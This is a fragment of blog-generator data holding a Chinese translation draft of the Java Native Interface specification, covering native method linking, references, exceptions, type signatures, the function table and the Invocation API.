1.1开始，一旦原生库被加载，它在所有类加载器中都是可见的。因此不同类加载器中的两个类可能链接同一个原生方法。这导致两个问题:\n\n* 一个类可能错误地链接到在不同类加载器中被同名类载入的原生库\n* 原生方法可以很容易的混合来自不同类加载器的类。这打破了类加载器提供的名称空间隔离，并导致类型安全问题\n\n从JDK/JRE 1.2开始，每个类加载器管理自己的一组原生库。同一个JNI原生库不能被载入到多个类加载器中。这样做会导致抛出UnsatisfiedLinkError。比如，System.loadLibrary在将一个原生库载入两个类加载时会抛出UnsatisfiedLinkError。新方法的好处是:\n\n* 基于类加载器的名称空间隔离被保留在原生库中。原生库不能很容易的混合来自不同类加载器的类\n* 此外，当对应的类加载器被垃圾回收时，原生库可以被卸载\n\n\n\n\n\n\n","source":"_drafts/JNIGuide/README.md","raw":"## 第一章\n\n### 介绍\n\nJNI是原生程序接口。它允许运行在虚拟机内部的Java代码与使用C,C++或者汇编语言编写的应用程序和库进行交互。\n\nJNI不会对底层Java VM的实现产生任何限制。Java VM制造商能够支持JNI而不对VM的其他部分产生任何影响。程序员可以编写原生应用程序或库的一个版本，并且希望它能够和所有支持JNI的Java VM一起工作。\n\n### JNI预览\n\n通过JNI编程，你能够使用原生方法创建、检查和更新Java对象，调用Java方法，捕获和抛出异常，加载类并且获取类信息，执行运行时类型检查。\n\n你可以使用JNI的Invocation API将任意的原生应用程序嵌入Java VM。这使得程序员很容易为现有的应用程序支持Java而并不需要链接VM源代码。\n\n## 第二章\n\n### JNI接口函数和指针\n\n原生代码通过调用JNI函数来访问Java VM功能。通过接口指针来访问JNI函数。接口指针是指向指针的指针。这个指针指向一个指针数组，其中每个都指向一个接口函数。每个接口函数都位于数组中预定义的偏移位置。\n\n![](./images/designa.gif)\n\nJNI接口指针仅在当前线程中可用。因此，原生方法不能将接口指针从一个线程传递到另一个线程。实现JNI的VM可以在JNI接口指针指向的区域中分配和存储线程本地数据。\n\n原生方法接收JNI接口指针作为参数。当从相同的Java线程中多次调用原生方法时，VM保证对原生方法传递相同的接口指针。然而一个原生方法能够从不同的Java线程中被调用，因此可能接收不同的JNI接口指针。\n\n### 编译、加载和链接原生方法\n\n使用System.loadLibrary方法来加载原生方法。下面的例子中，类初始化方法加载了一个特定平台的原生库，其中定义了原生方法f\n\n``` java\npackage pkg;  \n\nclass Cls { \n\n     native double f(int i, String s); \n\n     static { \n         System.loadLibrary(“pkg_Cls”); \n     } \n\n} \n```\n\nSystem.loadLibrary的参数是程序员任意选择的一个库名。系统遵循一种标准的但特定于平台的方法将库名转换成原生库名。例如Solaris系统将名字pkg_Cls转换为libpkg_Cls.so，而Win32系统将名字pkg_Cls转换为pkg_Cls.dll\n\n程序员可以使用一个库来保存任意数量类所需要的所有本地方法，只要使用相同的类加载器来加载这些类。VM内部为每个类加载器维护一个原生库加载列表。VM制造商应该选择本地库名称，以减少名称冲突的可能性。\n\n如果底层操作系统不支持动态链接，VM必须预链接所有本地方法。在这种情况下，VM完成System.loadLibrary调用而不实际加载库。\n\n程序员也可以调用JNI函数RegisterNatives来注册与类相关联的原生方法。RegisterNatives函数对于静态链接函数特别有用。\n\n### 解析原生方法名\n\n原生方法名由以下组件连接而成：\n\n* Java_前缀\n* 完全的类名\n* 下划线分隔符_\n* 方法名\n* 对于重载的本地方法，在两个下划线__后面加上参数签名\n\nVM检查方法名是否与驻留在原生库中的方法相匹配。VM首先查找短名称，没有参数签名的名称。然后查找长名称，带有参数签名的名称。只有当原生方法被另一个原生方法重载时，程序员才需要使用长名称。然而如果原生方法与非原生方法具有相同的名称，这是没有问题的。非原生方法不会驻留在原生库中。\n\n在下面的例子中，原生方法g不必使用长名称进行链接，因为另一个方法g不是原生方法，因此不在原生库中。\n\n``` java\nclass Cls1 { \n\n  int g(int i); \n\n  native int g(double d); \n\n} \n```\n\n我们采用一个简单的名称修改方案来确保所有的Unicode字符都转换为有效的C函数名。我们使用下划线字段_来替换完全类名中的斜杠/。由于名称和类型描述从不以数字开头，我们可以使用\\_0...\\_9来表示转义字符。\n\n| 转义字符 |                             表示                             |\n| :------: | :----------------------------------------------------------: |\n|  _0XXXX  | Unicode字符XXXX，使用小写字符表示非ASC码Unicode字符，例如_0abcd |\n|    _1    |                            字符_                             |\n|    _2    |                            字符;                             |\n|    _3    |                            字符[                             |\n\n在给定的平台上，本地方法和接口API都遵循标准库调用约定。例如UNIX系统使用C调用约定，Win32系统使用__stdcall\n\n### 本地方法参数\n\nJNI接口指针是本地方法的第一个参数。JNI接口指针的类型是JNIEnv。第二个参数取决于本地方法是静态的还是非静态的。非静态本地方法的第二个参数是对对象的引用，静态本地方法的第二个参数是对Java类的引用。\n\n其余参数对应于普通Java方法参数。本地方法调用通过返回值将结果传递回调用程序。\n\n下面的例子演示了使用C函数去实现原生方法f\n\n``` java\npackage pkg;  \n\nclass Cls { \n\n     native double f(int i, String s); \n\n     ... \n\n} \n```\n\n带有长名称Java_pkg_Cls_f_ILjava_lang_String_2的C函数实现本地方法f\n\n``` c\njdouble Java_pkg_Cls_f__ILjava_lang_String_2 (\n     JNIEnv *env,        /* interface pointer */\n     jobject obj,        /* \"this\" pointer */\n     jint i,             /* argument #1 */\n     jstring s)          /* argument #2 */\n{\n     /* Obtain a C-copy of the Java string */\n     const char *str = (*env)->GetStringUTFChars(env, s, 0);\n\n     /* process the string */\n     ...\n\n     /* Now we are done with str */\n     (*env)->ReleaseStringUTFChars(env, s, str);\n\n     return ...\n}\n```\n\n注意，我们总是使用接口指针env操作Java对象。下面的例子是C++版本:\n\n``` c++\nextern \"C\" /* specify the C calling convention */  \n\njdouble Java_pkg_Cls_f__ILjava_lang_String_2 ( \n\n     JNIEnv *env,        /* interface pointer */ \n\n     jobject obj,        /* \"this\" pointer */ \n\n     jint i,             /* argument #1 */ \n\n     jstring s)          /* argument #2 */ \n\n{ \n\n     const char *str = env->GetStringUTFChars(s, 0); \n\n     ... \n\n     env->ReleaseStringUTFChars(s, str); \n\n     return ... \n\n} \n\n```\n\n在C++中额外的间接层和接口指针参数从源代码中消失了。然而其底层机制和C完全相同。在C++中JNI函数被定义为内联成员函数，可以扩展为C对应函数。\n\n### 引用Java对象\n\n基本类型比如整数、字符等在Java和原生代码之间被复制。另一方面，Java对象是通过引用传递的。VM必须持续跟踪所有被传递到原生代码的对象，以便垃圾回收器不会释放这些对象。反之，原生代码必须有一种方式通知VM它不在需要这些对象。此外，垃圾回收器必须能够移动原生代码引用的对象。\n\n### 全局和本地引用\n\nJNI将原生代码使用的对象引用分为两类：本地引用和全局引用。本地引用在原生方法调用期间有效，并且在原生方法返回后自动释放。全局引用在明确释放之前保持有效。\n\n传递给原生方法的对象作为本地引用。JNI函数返回的所有Java对象都是本地引用。JNI允许程序员通过本地引用创建全局引用。期望Java对象的JNI函数同时接受全局和本地引用。原生方法可以返回对于VM的本地或者全局引用作为其结果。\n\n通常，程序员应该在原生方法返回后依靠VM释放所有本地引用。然而有时程序员应该明确释放本地引用。比如考虑以下情况：\n\n* 原生方法访问大型Java对象，从而创建对Java对象的本地引用。原生方法在返回调用者之前执行额外的计算。对大型Java对象的本地引用将防止对象被垃圾回收，即使该对象在剩余的计算中不再使用。\n* 原生方法会创建大量的本地引用，尽管并不是所有的本地引用都同时使用。由于VM需要一定的空间来持续跟踪本地引用，创建太多本地引用可能导致系统内存溢出。例如，本地方法循环遍历一个大的对象数组，获取元素作为本地引用，并在每次迭代中对一个元素进行操作。在每次迭代之后，程序员不再需要对数组元素的本地引用。\n\nJNI允许程序员在原生方法中的任何一点手动删除本地引用。为了确保程序员能够手动释放本地引用，JNI函数不允许创建额外的本地引用，除了它们作为返回结果的引用。\n\n本地引用仅在创建它们的线程中有效。原生代码不能将本地引用从一个线程传递到另一个线程。\n\n### 实现本地引用\n\n为了实现本地引用，Java VM为控制从Java到原生方法的每次转换创建一个注册表。注册表将不可移动的本地引用映射为Java对象，并防止对象被垃圾回收。所有传递给原生方法的Java对象(包括作为JNI函数调用返回结果的那些对象)都被自动添加到注册表中。注册表在原生方法返回后被删除，它的所有内容被垃圾回收。\n\n有不同的方法来实现注册表，例如使用表、链表或者散列表。虽然引用计数可以用来避免注册表中的重复内容，但是JNI实现并没有义务检测和折叠重复内容。\n\n注意，仅通过扫描原生堆栈不能准确的实现本地引用。原生代码可以将本地引用保存在全局或者堆数据结构中。\n\n### 访问Java对象\n\nJNI为全局和本地引用提供了一组丰富的访问函数。这意味着无论VM内部如何表示Java对象，相同的原生方法实现都可以工作。这是JNI能够被各种VM实现支持的一个重要原因。\n\n通过引用使用访问函数的开销要高于直接访问C数据结构。在大多数情况下，我们相信Java程序员使用原生方法来执行一些重要任务，这些任务掩盖了接口的开销。\n\n### 访问原始数组\n\n对于包含许多基本数据类型的大型Java对象，这种开销是不能接受的。考虑用于执行向量和矩阵计算的原生方法。遍历Java数组并使用函数调用获取每个元素的效率非常低。\n\n一种解决方案引入了固定的概念，以便原生方法可以要求VM固定数组的内容。原生方法然后接收一个指向元素的指针。然而这种方法有两个条件:\n\n* 垃圾回收必须支持固定\n* VM必须在内存中连续存储原始数组。虽然这是大多数原始数组最合理的实现，布尔数组可以通过打包或解包实现。因此依赖于布尔数组精确布局的原生代码是不可移植的。\n\n我们采用折中方案克服了上面的两个问题。\n\n首先我们提供了一组函数在Java数组和原生内存缓冲区之间复制基本数组元素。如果原生方法只需要访问一个大数组中的少量元素则使用这些函数。\n\n其次程序员可以使用另一组函数来获取数组元素的固定版本。请记住这些函数可能需要Java VM执行存储分配和复制。这些函数实际上是否复制数组取决于VM的实现:\n\n* 如果垃圾回收支持固定，并且数组的存储与原生方法所期望的相同则不需要复制。\n* 否则数组将被复制到一个不可移动的内存块(比如C堆中)，并执行必要的格式转换。返回一个副本的指针。\n\n最后接口提供了通知VM原生代码不再需要访问数组元素的函数。当调用这些函数时，系统将解除数组的固定，或者将原始数组与其不可移动的副本进行协调并释放副本。\n\n我们提供的方法更加灵活。垃圾回收算法可以对每个给定数组的复制或者固定做出单独的决定。比如，垃圾回收可以复制小对象，但固定大对象。\n\nJNI实现必须确保在多个线程中运行的原生方法能够同时访问同一个数组。比如，JNI可以为每个固定的数组保留一个内部计数器，这样一个线程就不会解除另一个线程固定的数组。注意，JNI不需要为原生方法的独占访问锁定原始数组。同时从不同的线程更新Java数组会导致不确定的结果。\n\n### 访问属性和方法\n\nJNI允许原生代码访问属性和调用Java对象方法。JNI通过符号名和类型签名来标识方法和属性。两步法从名称和签名中计算出定位属性或方法的成本。比如，调用cls类中的方法f时，原生代码首先获取一个方法ID:\n\n``` c\njmethodID mid =      env->GetMethodID(cls, “f”, “(ILjava/lang/String;)D”); \n```\n\n然后，原生代码可以重复使用方法ID而不需要执行方法查找\n\n``` c\njdouble result = env->CallDoubleMethod(obj, mid, 10, str); \n```\n\n属性或方法ID不会阻止VM卸载从其生成ID的类。类被卸载之后属性或方法ID将不可用。因此，如果打算在一段时间内使用属性或者方法ID，原生代码必须确保:\n\n* 保持对底层类的引用\n* 或者重新计算属性或方法ID\n\nJNI不会对属性和方法ID如何在内部实现施加任何限制。\n\n### 报告编程错误\n\nJNI不检查编程错误，比如传空指针或者非法参数类型。非法参数类型包括使用普通Java对象而不是Java类对象。JNI不检查这些编程错误的原因如下:\n\n* 强制JNI函数检查所有可能的错误条件会降低正常原生方法的性能\n* 在很多情况下，没有足够的运行时类型信息来执行这样的检查\n\n大多数C库函数不能防止编程错误。比如，当printf函数接收到一个无效地址时通常会引发运行时错误，而不是返回错误代码。强制C库函数检查所有可能的错误条件可能导致这样的检查在用户代码中和库中重复进行。\n\n程序员不能向JNI函数传递非法指针或错误类型参数。这样会导致不可预期的后果，包括系统状态损坏或VM崩溃。\n\n### Java异常\n\nJNI允许原生方法引发任意Java异常。原生代码也能处理未处理的Java异常。未处理的Java异常被传递回VM。\n\n### 异常和错误代码\n\n某些JNI函数使用Java异常机制来报告错误条件。在很多情况下，JNI函数通过返回错误代码并且抛出Java异常来报告错误条件。错误代码通常是一个特殊的返回值(比如NULL)，它超出了正常返回值的范围。因此程序员可以:\n\n* 快速检查最后一个JNI调用的返回值，已确定是否发生了错误\n* 调用ExceptionOccurred函数以获取包含更详细描述错误条件的异常对象\n\n在两种情况下，程序员需要检查异常而不能首先检查错误代码:\n\n* 调用Java方法的JNI函数返回Java方法的结果。程序员必须调用ExceptionOccurred来检查Java方法执行期间可能发生的异常\n* 一些JNI数组访问函数不返回错误代码，但可能抛出ArrayIndexOutOfBoundsException或ArrayStoreException异常\n\n在所有其他情况下，非错误返回值保证没有抛出异常。\n\n### 异步异常\n\n在多线程情况下，当前线程之外的其他线程可能抛出异步异常。异步异常不会立即影响当前线程中原生代码的执行，直到:\n\n* 原生代码调用可能引发同步异常的JNI函数\n* 原生代码使用ExceptionOccurred明确的检查同步和异步异常\n\n注意，只有那些可能引发同步异常的JNI函数才会检查异步异常\n\n原生方法应该在必要的地方插入ExceptionOccurred检查(比如在没有其他异常检查的循环中)，以确保当前线程在合理的时间内响应异步异常。\n\n### 异常处理\n\n在原生代码中有两种处理异常的方法:\n\n* 原生方法可以选择立即返回，从而使在初始化原生方法调用的Java代码中抛出异常\n* 原生代码可以通过调用ExceptionClear清除异常，然后执行自己的异常处理代码\n\n在异常出现之后，原生代码必须在调用其他JNI函数之前首先清除异常。当存在待处理的异常时，可以安全调用的JNI函数包括:\n\n``` c\n  ExceptionOccurred()\n  ExceptionDescribe()\n  ExceptionClear()\n  ExceptionCheck()\n  ReleaseStringChars()\n  ReleaseStringUTFChars()\n  ReleaseStringCritical()\n  Release<Type>ArrayElements()\n  ReleasePrimitiveArrayCritical()\n  DeleteLocalRef()\n  DeleteGlobalRef()\n  DeleteWeakGlobalRef()\n  MonitorExit()\n  PushLocalFrame()\n  PopLocalFrame()\n```\n\n## 第三章\n\n### 基本类型\n\n下面的表格描述Java基本类型和对应的依赖于机器的原生类型\n\n| Java类型 | 原生类型 | 描述       |\n| -------- | -------- | ---------- |\n| boolean  | jboolean | 无符号8位  |\n| byte     | jbyte    | 有符号8位  |\n| char     | jchar    | 无符号16位 |\n| short    | jshort   | 有符号16位 |\n| int      | jint     | 有符号32位 |\n| long     | jlong    | 有符号64位 |\n| float    | jfloat   | 32位       |\n| double   | jdouble  | 64位       |\n| void     | void     |            |\n\n为了方便起见提供了以下定义\n\n``` c\n#define JNI_FALSE  0 \n#define JNI_TRUE   1 \n```\n\njsize整数类型用于描述基本的索引和大小\n\n``` c\ntypedef jint jsize; \n```\n\n### 引用类型\n\nJNI包含很多对应于不同Java对象类型的引用类型。\n\n![](./images/types4.gif)\n\n在C中，所有其他JNI引用类型都被定义为与jobject相同。比如:\n\n``` c\ntypedef jobject jclass; \n```\n\n在C++中，JNI引入了一组虚拟类来表示子类型关系。比如:\n\n``` c++\nclass _jobject {}; \nclass _jclass : public _jobject {}; \n... \ntypedef _jobject *jobject; \ntypedef _jclass *jclass; \n```\n\n### 属性和方法ID\n\n方法和属性ID是常规的C指针类型\n\n``` c\nstruct _jfieldID;              /* opaque structure */ \ntypedef struct _jfieldID *jfieldID;   /* field IDs */ \n \nstruct _jmethodID;              /* opaque structure */ \ntypedef struct _jmethodID *jmethodID; /* method IDs */ \n```\n\n### 值类型\n\njvalue联合类型被用作参数数组中的元素类型。\n\n``` c\ntypedef union jvalue { \n    jboolean z; \n    jbyte    b; \n    jchar    c; \n    jshort   s; \n    jint     i; \n    jlong    j; \n    jfloat   f; \n    jdouble  d; \n    jobject  l; \n} jvalue; \n```\n\n### 类型签名\n\nJNI使用Java VM的类型签名表示。\n\n| 类型签名                  | Java类型 |\n| ------------------------- | -------- |\n| Z                         | boolean  |\n| B                         | byte     |\n| C                         | char     |\n| S                         | short    |\n| I                         | int      |\n| J                         | long     |\n| F                         | float    |\n| D                         | double   |\n| L fully-qualified-class ; | 完整类名 |\n| [ type                    | 类型数组 |\n| ( arg-types ) ret-type    | 方法类型 |\n\n比如，Java方法:\n\n``` java\nlong f (int n, String s, int[] arr); \n```\n\n对应下面的类型签名:\n\n``` c\n(ILjava/lang/String;[I)J \n```\n\n### 改进的UTF-8字符串\n\nJNI使用改进的UTF-8字符串来表示各种字符串类型。改进的UTF-8字符串与Java VM使用的字符串相同。对改进的UTF-8字符串进行编码，以便仅包含非空ASC码字符的字符序列只能用每个字符一个字节表示，但是所有Unicode字符都能被表示。\n\n这种格式与标准UTF-8格式之间有两个不同。首先，使用双字节格式而不是单字节格式对空字符进行编码。这意味着改进的UTF-8字符串永远不会引入空值。其次，只使用标准UTF-8的一字节、二字节和三字节格式。Java VM不识别标准UTF-8的四字节格式，它使用自己的两倍三字节格式代替。\n\n## 第四章\n\n本章作为JNI函数的参考部分，提供了所有JNI函数的完整列表。\n\n注意，\"必须\"一词用来描述对JNI程序员的限制。比如，当你看到某个JNI函数必须接收一个非空对象时，你有责任确保没有将空传递给JNI函数。因此，JNI实现不需要在该JNI函数中执行空指针检查。\n\n### 接口函数表\n\n每个函数都可以通过JNIEnv参数以固定的偏移量访问。JNIEnv类型是一个指向存储所有JNI函数指针结构体的指针。定义如下:\n\n``` c\ntypedef const struct JNINativeInterface *JNIEnv; \n```\n\nVM初始化函数表。注意，前三个条目是为了将来与COM兼容而保留的。此外，我们在函数表的开始处保留了许多额外的空条目，以便将来与类相关的JNI操作可以添加在FindClass之后，而不是在表的末尾。\n\n注意，函数表可以在所有JNI接口指针之间共享。\n\n``` c\nconst struct JNINativeInterface ... = {\n\n    NULL,\n    NULL,\n    NULL,\n    NULL,\n    GetVersion,\n\n    DefineClass,\n    FindClass,\n\n    FromReflectedMethod,\n    FromReflectedField,\n    ToReflectedMethod,\n\n    GetSuperclass,\n    IsAssignableFrom,\n\n    ToReflectedField,\n\n    Throw,\n    ThrowNew,\n    ExceptionOccurred,\n    ExceptionDescribe,\n    ExceptionClear,\n    FatalError,\n\n    PushLocalFrame,\n    PopLocalFrame,\n\n    NewGlobalRef,\n    DeleteGlobalRef,\n    DeleteLocalRef,\n    IsSameObject,\n    NewLocalRef,\n    EnsureLocalCapacity,\n\n    AllocObject,\n    NewObject,\n    NewObjectV,\n    NewObjectA,\n\n    GetObjectClass,\n    IsInstanceOf,\n\n    GetMethodID,\n\n    CallObjectMethod,\n    CallObjectMethodV,\n    CallObjectMethodA,\n    CallBooleanMethod,\n    CallBooleanMethodV,\n    CallBooleanMethodA,\n    CallByteMethod,\n    CallByteMethodV,\n    CallByteMethodA,\n    CallCharMethod,\n    CallCharMethodV,\n    CallCharMethodA,\n    CallShortMethod,\n    CallShortMethodV,\n    CallShortMethodA,\n    CallIntMethod,\n    CallIntMethodV,\n    CallIntMethodA,\n    CallLongMethod,\n    CallLongMethodV,\n    CallLongMethodA,\n    CallFloatMethod,\n    CallFloatMethodV,\n    CallFloatMethodA,\n    CallDoubleMethod,\n    CallDoubleMethodV,\n    CallDoubleMethodA,\n    CallVoidMethod,\n    CallVoidMethodV,\n    CallVoidMethodA,\n\n    CallNonvirtualObjectMethod,\n    CallNonvirtualObjectMethodV,\n    CallNonvirtualObjectMethodA,\n    CallNonvirtualBooleanMethod,\n    CallNonvirtualBooleanMethodV,\n    CallNonvirtualBooleanMethodA,\n    CallNonvirtualByteMethod,\n    CallNonvirtualByteMethodV,\n    CallNonvirtualByteMethodA,\n    CallNonvirtualCharMethod,\n    CallNonvirtualCharMethodV,\n    CallNonvirtualCharMethodA,\n    CallNonvirtualShortMethod,\n    CallNonvirtualShortMethodV,\n    CallNonvirtualShortMethodA,\n    CallNonvirtualIntMethod,\n    CallNonvirtualIntMethodV,\n    CallNonvirtualIntMethodA,\n    CallNonvirtualLongMethod,\n    CallNonvirtualLongMethodV,\n    CallNonvirtualLongMethodA,\n    CallNonvirtualFloatMethod,\n    CallNonvirtualFloatMethodV,\n    CallNonvirtualFloatMethodA,\n    CallNonvirtualDoubleMethod,\n    CallNonvirtualDoubleMethodV,\n    CallNonvirtualDoubleMethodA,\n    CallNonvirtualVoidMethod,\n    CallNonvirtualVoidMethodV,\n    CallNonvirtualVoidMethodA,\n\n    GetFieldID,\n\n    GetObjectField,\n    GetBooleanField,\n    GetByteField,\n    GetCharField,\n    GetShortField,\n    GetIntField,\n    GetLongField,\n    GetFloatField,\n    GetDoubleField,\n    SetObjectField,\n    SetBooleanField,\n    SetByteField,\n    SetCharField,\n    SetShortField,\n    SetIntField,\n    SetLongField,\n    SetFloatField,\n    SetDoubleField,\n\n    GetStaticMethodID,\n\n    CallStaticObjectMethod,\n    CallStaticObjectMethodV,\n    CallStaticObjectMethodA,\n    CallStaticBooleanMethod,\n    CallStaticBooleanMethodV,\n    CallStaticBooleanMethodA,\n    CallStaticByteMethod,\n    CallStaticByteMethodV,\n    CallStaticByteMethodA,\n    CallStaticCharMethod,\n    CallStaticCharMethodV,\n    CallStaticCharMethodA,\n    CallStaticShortMethod,\n    CallStaticShortMethodV,\n    CallStaticShortMethodA,\n    CallStaticIntMethod,\n    CallStaticIntMethodV,\n    CallStaticIntMethodA,\n    CallStaticLongMethod,\n    CallStaticLongMethodV,\n    CallStaticLongMethodA,\n    CallStaticFloatMethod,\n    CallStaticFloatMethodV,\n    CallStaticFloatMethodA,\n    CallStaticDoubleMethod,\n    CallStaticDoubleMethodV,\n    CallStaticDoubleMethodA,\n    CallStaticVoidMethod,\n    CallStaticVoidMethodV,\n    CallStaticVoidMethodA,\n\n    GetStaticFieldID,\n\n    GetStaticObjectField,\n    GetStaticBooleanField,\n    GetStaticByteField,\n    GetStaticCharField,\n    GetStaticShortField,\n    GetStaticIntField,\n    GetStaticLongField,\n    GetStaticFloatField,\n    GetStaticDoubleField,\n\n    SetStaticObjectField,\n    SetStaticBooleanField,\n    SetStaticByteField,\n    SetStaticCharField,\n    SetStaticShortField,\n    SetStaticIntField,\n    SetStaticLongField,\n    SetStaticFloatField,\n    SetStaticDoubleField,\n\n    NewString,\n\n    GetStringLength,\n    GetStringChars,\n    ReleaseStringChars,\n\n    NewStringUTF,\n    GetStringUTFLength,\n    GetStringUTFChars,\n    ReleaseStringUTFChars,\n\n    GetArrayLength,\n\n    NewObjectArray,\n    GetObjectArrayElement,\n    SetObjectArrayElement,\n\n    NewBooleanArray,\n    NewByteArray,\n    NewCharArray,\n    NewShortArray,\n    NewIntArray,\n    NewLongArray,\n    NewFloatArray,\n    NewDoubleArray,\n\n    GetBooleanArrayElements,\n    GetByteArrayElements,\n    GetCharArrayElements,\n    GetShortArrayElements,\n    GetIntArrayElements,\n    GetLongArrayElements,\n    GetFloatArrayElements,\n    GetDoubleArrayElements,\n\n    ReleaseBooleanArrayElements,\n    ReleaseByteArrayElements,\n    ReleaseCharArrayElements,\n    ReleaseShortArrayElements,\n    ReleaseIntArrayElements,\n    ReleaseLongArrayElements,\n    ReleaseFloatArrayElements,\n    ReleaseDoubleArrayElements,\n\n    GetBooleanArrayRegion,\n    GetByteArrayRegion,\n    GetCharArrayRegion,\n    GetShortArrayRegion,\n    GetIntArrayRegion,\n    GetLongArrayRegion,\n    GetFloatArrayRegion,\n    GetDoubleArrayRegion,\n    SetBooleanArrayRegion,\n    SetByteArrayRegion,\n    SetCharArrayRegion,\n    SetShortArrayRegion,\n    SetIntArrayRegion,\n    SetLongArrayRegion,\n    SetFloatArrayRegion,\n    SetDoubleArrayRegion,\n\n    RegisterNatives,\n    UnregisterNatives,\n\n    MonitorEnter,\n    MonitorExit,\n\n    GetJavaVM,\n\n    GetStringRegion,\n    GetStringUTFRegion,\n\n    GetPrimitiveArrayCritical,\n    ReleasePrimitiveArrayCritical,\n\n    GetStringCritical,\n    ReleaseStringCritical,\n\n    NewWeakGlobalRef,\n    DeleteWeakGlobalRef,\n\n    ExceptionCheck,\n\n    NewDirectByteBuffer,\n    GetDirectBufferAddress,\n    GetDirectBufferCapacity,\n\n    GetObjectRefType\n  };\n```\n\n## 第五章\n\nInvocation API允许软件开发商将Java VM加载到任意的原生应用程序中。开发商可以在不链接Java VM源代码的情况下交付支持Java的应用程序。\n\n### 介绍\n\n下面的代码示例演示了如何在Invocation API中使用函数。在这个例子中，C++代码创建了一个Java VM并调用名为Main.test的静态方法。\n\n``` c\n    #include <jni.h>       /* where everything is defined */\n    ...\n    JavaVM *jvm;       /* denotes a Java VM */\n    JNIEnv *env;       /* pointer to native method interface */\n    JavaVMInitArgs vm_args; /* JDK/JRE 6 VM initialization arguments */\n    JavaVMOption* options = new JavaVMOption[1];\n    options[0].optionString = \"-Djava.class.path=/usr/lib/java\";\n    vm_args.version = JNI_VERSION_1_6;\n    vm_args.nOptions = 1;\n    vm_args.options = options;\n    vm_args.ignoreUnrecognized = false;\n    /* load and initialize a Java VM, return a JNI interface\n     * pointer in env */\n    JNI_CreateJavaVM(&jvm, (void**)&env, &vm_args);\n    delete options;\n    /* invoke the Main.test method using the JNI */\n    jclass cls = env->FindClass(\"Main\");\n    jmethodID mid = env->GetStaticMethodID(cls, \"test\", \"(I)V\");\n    env->CallStaticVoidMethod(cls, mid, 100);\n    /* We are done. */\n    jvm->DestroyJavaVM();\n```\n\n这个例子使用了API中的三个函数。Invocation API允许原生应用程序使用JNI接口指针访问VM特性。\n\n### 创建VM\n\nJNI_CreateJavaVM函数加载并初始化一个Java VM，并返回一个指向JNI接口指针的指针。调用JNI_CreateJavaVM函数的线程被作为主线程。\n\n### 绑定VM\n\nJNI接口指针JNIEnv仅在当前线程有效。如果另一个线程需要访问Java VM，它必须先调用AttachCurrentThread将自己绑定到VM，并获得JNI接口指针。一旦绑定到VM，原生线程就像运行在原生方法内部的普通Java线程一样工作。原生线程保持与VM绑定，直到调用DetachCurrentThread来解绑自己。\n\n绑定线程应该有足够的堆栈空间来执行一定数量的工作。每个线程的堆栈空间分配特定于操作系统。\n\n### 解绑VM\n\n绑定到VM的原生线程在退出之前必须调用DetachCurrentThread来解绑自己。如果调用堆栈上有Java方法，线程不能解绑自己。\n\n### 卸载VM\n\nJNI_DestroyJavaVM函数卸载一个Java VM。从JDK/JRE1.1开始，只有主线程可以通过调用DestroyJavaVM卸载VM。从JDK/JRE1.2开始限制被取消，任何线程都可以调用DestroyJavaVM卸载VM。\n\nVM等待直到当前线程成为唯一的非守护用户线程才真正卸载。用户线程包括Java线程和绑定的原生线程。存在此限制是因为Java线程或绑定的原生线程可能持有系统资源，比如锁、窗口等。VM不能自动释放这些资源。通过将当前线程限制为卸载VM时唯一运行的线程，程序员将承担释放任意线程占用系统资源的责任。\n\n### 库和版本管理\n\n从JDK/JRE 1.1开始，一旦原生库被加载，它在所有类加载器中都是可见的。因此不同类加载器中的两个类可能链接同一个原生方法。这导致两个问题:\n\n* 一个类可能错误地链接到在不同类加载器中被同名类载入的原生库\n* 原生方法可以很容易的混合来自不同类加载器的类。这打破了类加载器提供的名称空间隔离，并导致类型安全问题\n\n从JDK/JRE 1.2开始，每个类加载器管理自己的一组原生库。同一个JNI原生库不能被载入到多个类加载器中。这样做会导致抛出UnsatisfiedLinkError。比如，System.loadLibrary在将一个原生库载入两个类加载时会抛出UnsatisfiedLinkError。新方法的好处是:\n\n* 基于类加载器的名称空间隔离被保留在原生库中。原生库不能很容易的混合来自不同类加载器的类\n* 此外，当对应的类加载器被垃圾回收时，原生库可以被卸载\n\n\n\n\n\n\n","slug":"JNIGuide/README","published":0,"date":"2025-09-11T16:39:00.916Z","updated":"2025-09-11T16:39:00.916Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmfs21ah40000rxje9b3t4q11","content":"<h2 id=\"第一章\"><a href=\"#第一章\" class=\"headerlink\" title=\"第一章\"></a>第一章</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>JNI是原生程序接口。它允许运行在虚拟机内部的Java代码与使用C,C++或者汇编语言编写的应用程序和库进行交互。</p>\n<p>JNI不会对底层Java VM的实现产生任何限制。Java VM制造商能够支持JNI而不对VM的其他部分产生任何影响。程序员可以编写原生应用程序或库的一个版本，并且希望它能够和所有支持JNI的Java VM一起工作。</p>\n<h3 id=\"JNI预览\"><a href=\"#JNI预览\" class=\"headerlink\" title=\"JNI预览\"></a>JNI预览</h3><p>通过JNI编程，你能够使用原生方法创建、检查和更新Java对象，调用Java方法，捕获和抛出异常，加载类并且获取类信息，执行运行时类型检查。</p>\n<p>你可以使用JNI的Invocation API将任意的原生应用程序嵌入Java VM。这使得程序员很容易为现有的应用程序支持Java而并不需要链接VM源代码。</p>\n<h2 id=\"第二章\"><a href=\"#第二章\" class=\"headerlink\" title=\"第二章\"></a>第二章</h2><h3 id=\"JNI接口函数和指针\"><a href=\"#JNI接口函数和指针\" class=\"headerlink\" title=\"JNI接口函数和指针\"></a>JNI接口函数和指针</h3><p>原生代码通过调用JNI函数来访问Java VM功能。通过接口指针来访问JNI函数。接口指针是指向指针的指针。这个指针指向一个指针数组，其中每个都指向一个接口函数。每个接口函数都位于数组中预定义的偏移位置。</p>\n<p><img src=\"./images/designa.gif\"></p>\n<p>JNI接口指针仅在当前线程中可用。因此，原生方法不能将接口指针从一个线程传递到另一个线程。实现JNI的VM可以在JNI接口指针指向的区域中分配和存储线程本地数据。</p>\n<p>原生方法接收JNI接口指针作为参数。当从相同的Java线程中多次调用原生方法时，VM保证对原生方法传递相同的接口指针。然而一个原生方法能够从不同的Java线程中被调用，因此可能接收不同的JNI接口指针。</p>\n<h3 id=\"编译、加载和链接原生方法\"><a href=\"#编译、加载和链接原生方法\" class=\"headerlink\" title=\"编译、加载和链接原生方法\"></a>编译、加载和链接原生方法</h3><p>使用System.loadLibrary方法来加载原生方法。下面的例子中，类初始化方法加载了一个特定平台的原生库，其中定义了原生方法f</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 